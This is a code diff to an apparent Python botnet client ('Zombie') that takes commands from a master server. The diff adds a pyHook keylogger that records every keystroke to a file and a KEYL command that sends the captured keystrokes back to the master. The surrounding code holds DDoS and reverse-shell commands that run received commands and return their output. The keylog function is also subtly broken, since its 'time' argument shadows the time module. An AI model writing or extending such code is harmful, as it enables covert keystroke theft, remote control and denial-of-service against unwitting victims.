@@ -1,12 +1,23 @@
 import sys
 import socket
 import subprocess
-# from thread import *
+import pyHook, pythoncom, sys, logging
+import time
 
 
 MASTER_IP = "127.0.0.1"
 MASTER_PORT = 6000
 ZOMB_PORT = int(sys.argv[1])
+
+
+file_log = 'l.txt'
+
+def OnKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+
 
 class Zombie:
 
@@ -50,7 +61,20 @@ class Zombie:
 			# send back output
 			self.conn.sendto(stdout_value,(MASTER_IP,MASTER_PORT))
 
+	#Keylog for a time period and send data back to master
+	def keylog(self,time):
 
+		start = time.time()
+		while time.time() - start < time:
+			pythoncom.PumpWaitingMessages()
+
+		f = open(file_log,'r')
+		data = f.read()
+		self.conn.sendto("Keylog data",(MASTER_IP,MASTER_PORT))
+		self.conn.sendto(data,(MASTER_IP,MASTER_PORT))
+		f.close()
+
+	#Parse masters command
 	def parse_cmd(self,p):
 		# packet = conn.recv(1024)
 		packet = p.split(';')
@@ -59,10 +83,12 @@ class Zombie:
 		if packet[0] == "DDOS":
 			self.dos(packet[1],int(packet[2]))
 
-		elif packet[0] == "SPAM":
-			pass
+		#packet = "KEYL;TIME"
+		#TIME is in seconds
+		elif packet[0] == "KEYL":
+			self.keylog(int(packet[1]))
 
-		#packet  = "RVSH\r\n"
+		#packet  = "RVSH"
 		elif packet[0] == "RVSH":
 			self.conn.sendto("RVSH",(MASTER_IP,MASTER_PORT))				#Tell master to start sending commands
 			self.reverse_shell()
@@ -87,6 +113,10 @@ if __name__ == '__main__':
 
 	
 	zomb = Zombie(s)
+	hooks_manager = pyHook.HookManager()
+	hooks_manager.KeyDown = OnKeyboardEvent
+	hooks_manager.HookKeyboard()
+
 	while True:
 		#Receive command
 		data, addr = zomb.conn.recvfrom(1024)
